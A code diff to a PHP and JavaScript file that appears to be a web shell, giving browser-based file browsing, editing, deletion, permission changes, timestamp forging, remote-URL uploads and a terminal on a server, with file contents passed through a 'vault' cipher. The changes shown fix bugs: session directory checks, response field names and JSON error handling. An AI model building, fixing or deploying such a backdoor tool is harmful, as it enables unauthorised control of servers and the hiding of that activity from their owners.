@@ -60,7 +60,7 @@ function get_store($key) {
 $action = isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : '');
 
 // Virtual Session Initialization
-if (empty($_SESSION['current_dir'])) {
+if (empty($_SESSION['current_dir']) || !is_dir($_SESSION['current_dir'])) {
     $cwd = getcwd();
     $_SESSION['current_dir'] = ($cwd && realpath($cwd)) ? realpath($cwd) : '.';
 }
@@ -532,7 +532,7 @@ if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQ
                 $listing = getDirectoryListing($dir);
                 if ($listing !== false) {
                     $_SESSION['current_dir'] = $dir;
-                    $response = array('status' => 'success', 'path' => $dir, 'listing' => $listing);
+                    $response = array('status' => 'success', 'path' => $dir, 'is_dir' => true, 'listing' => $listing);
                 } else { $response['message'] = 'Permission denied or error reading directory.'; }
             } else { $response['message'] = 'Directory not found or inaccessible: ' . $post_dir; }
             break;
@@ -540,7 +540,7 @@ if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQ
             $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']);
             if ($path && is_file($path) && is_readable($path)) {
                 $vkey = get_vault_key();
-                $response = array('status' => 'success', 'path' => $path, 'content' => vault_decrypt(file_get_contents($path), $vkey));
+                $response = array('status' => 'success', 'filePath' => $path, 'content' => vault_decrypt(file_get_contents($path), $vkey));
             } else { $response['message'] = 'File not found or not readable.'; }
             break;
         case 'save_file':
@@ -563,7 +563,7 @@ if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQ
                 $type = $_POST['type'];
                 if (file_exists($new_path)) { $response['message'] = 'Item already exists.'; }
                 elseif (($type === 'dir' && @mkdir($new_path)) || ($type === 'file' && @touch($new_path))) {
-                    $response = array('status' => 'success', 'message' => ucfirst($type) . ' created.');
+                    $response = array('status' => 'success', 'message' => ucfirst($type) . ' created.', 'path' => ($type === 'dir' ? $new_path : null), 'is_dir' => ($type === 'dir'), 'filePath' => ($type === 'file' ? $new_path : null));
                 } else { $response['message'] = 'Creation failed.'; }
             } else { $response['message'] = 'Invalid name.'; }
             break;
@@ -941,10 +941,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 throw new Error(`HTTP ${response.status}: ${text.substring(0, 100)}`);
             }
 
-            const data = await response.json();
+            let data;
+            try { data = await response.json(); } catch(e) { throw new Error('Invalid JSON response'); }
             if (data.status === 'error') throw new Error(data.message || 'Unknown API error');
 
-            if (data.path) sessionStorage.setItem('v_cwd', data.path);
+            if (data.path && data.is_dir) sessionStorage.setItem('v_cwd', data.path);
             if (data.cwd) {
                 sessionStorage.setItem('v_tcwd', data.cwd);
                 state.terminalCwd = data.cwd;
@@ -979,7 +980,7 @@ document.addEventListener('DOMContentLoaded', () => {
             showToast("File Manager Error: " + data.message);
         }
     };
-    G('file-manager-tbody').addEventListener('click', e => { const dirLink = e.target.closest('a[data-dir]'); const actionTarget = e.target.closest('[data-action]'); if (dirLink) { e.preventDefault(); loadFileManager(G('path-bar').textContent + '/' + dirLink.dataset.dir); return; } if (actionTarget) { e.preventDefault(); const action = actionTarget.dataset.action; const path = actionTarget.dataset.path; const currentPath = G('path-bar').textContent; if (action === 'delete') { if (confirm(`Are you sure you want to delete "${path}"?`)) { apiRequest(buildFormData({ action: 'delete_item', path })).then(d => d && loadFileManager(currentPath)); } } else if (action === 'edit' || action === 'preview') { apiRequest(buildFormData({ action: 'get_file_content', path })).then(data => { if (data) { state.currentFileForEditor = data.path; G('editor-header').textContent = `File: ${data.path}`; G('file-content-textarea').value = data.content; G('editor-modal').style.display = 'flex'; } }); } else if (action === 'rename') { const newName = prompt(`Enter new name for "${path}":`, path); if (newName && newName !== path) { apiRequest(buildFormData({ action: 'rename_item', path, new_name: newName })).then(d => d && loadFileManager(currentPath)); } } else if (action === 'perms') { const currentPerms = actionTarget.dataset.currentPerms || '0644'; const newPerms = prompt(`Enter new permissions for "${path}" (octal format):`, currentPerms); if (newPerms && /^[0-7]{3,4}$/.test(newPerms)) { apiRequest(buildFormData({ action: 'change_permissions', path, permissions: newPerms })).then(d => d && loadFileManager(currentPath)); } else if (newPerms !== null) { showToast('Invalid format. Please use 3 or 4 octal digits (e.g., 0755).'); } } else if (action === 'date') { const newDate = prompt(`Enter a new date/time for "${path}":\n(e.g., "now", "2024-01-01 12:00:00")`, "now"); if (newDate) { apiRequest(buildFormData({ action: 'change_date', path, new_date: newDate })).then(d => d && loadFileManager(currentPath)); } } } });
+    G('file-manager-tbody').addEventListener('click', e => { const dirLink = e.target.closest('a[data-dir]'); const actionTarget = e.target.closest('[data-action]'); if (dirLink) { e.preventDefault(); loadFileManager(G('path-bar').textContent + '/' + dirLink.dataset.dir); return; } if (actionTarget) { e.preventDefault(); const action = actionTarget.dataset.action; const path = actionTarget.dataset.path; const currentPath = G('path-bar').textContent; if (action === 'delete') { if (confirm(`Are you sure you want to delete "${path}"?`)) { apiRequest(buildFormData({ action: 'delete_item', path })).then(d => d && loadFileManager(currentPath)); } } else if (action === 'edit' || action === 'preview') { apiRequest(buildFormData({ action: 'get_file_content', path })).then(data => { if (data) { state.currentFileForEditor = data.filePath; G('editor-header').textContent = `File: ${data.filePath}`; G('file-content-textarea').value = data.content; G('editor-modal').style.display = 'flex'; } }); } else if (action === 'rename') { const newName = prompt(`Enter new name for "${path}":`, path); if (newName && newName !== path) { apiRequest(buildFormData({ action: 'rename_item', path, new_name: newName })).then(d => d && loadFileManager(currentPath)); } } else if (action === 'perms') { const currentPerms = actionTarget.dataset.currentPerms || '0644'; const newPerms = prompt(`Enter new permissions for "${path}" (octal format):`, currentPerms); if (newPerms && /^[0-7]{3,4}$/.test(newPerms)) { apiRequest(buildFormData({ action: 'change_permissions', path, permissions: newPerms })).then(d => d && loadFileManager(currentPath)); } else if (newPerms !== null) { showToast('Invalid format. Please use 3 or 4 octal digits (e.g., 0755).'); } } else if (action === 'date') { const newDate = prompt(`Enter a new date/time for "${path}":\n(e.g., "now", "2024-01-01 12:00:00")`, "now"); if (newDate) { apiRequest(buildFormData({ action: 'change_date', path, new_date: newDate })).then(d => d && loadFileManager(currentPath)); } } } });
     G('create-item-form').addEventListener('submit', async e => { e.preventDefault(); if (await apiRequest(buildFormData({ action: 'create_item', type: e.submitter.dataset.type, name: G('new-item-name').value }))) { G('new-item-name').value = ''; loadFileManager(G('path-bar').textContent); } });
     G('upload-form').addEventListener('submit', async e => { e.preventDefault(); const files = G('upload-files-input').files; if (files.length === 0) return; const formData = new FormData(); formData.append('action', 'upload_files'); for (const file of files) formData.append('upload_files[]', file); if (await apiRequest(formData)) { G('upload-form').reset(); loadFileManager(G('path-bar').textContent); } });
     G('upload-link-form').addEventListener('submit', async e => { e.preventDefault(); const url = G('upload-link-url').value; if (!url) return; if (await apiRequest(buildFormData({ action: 'upload_from_url', url }))) { G('upload-link-url').value = ''; loadFileManager(G('path-bar').textContent); } });
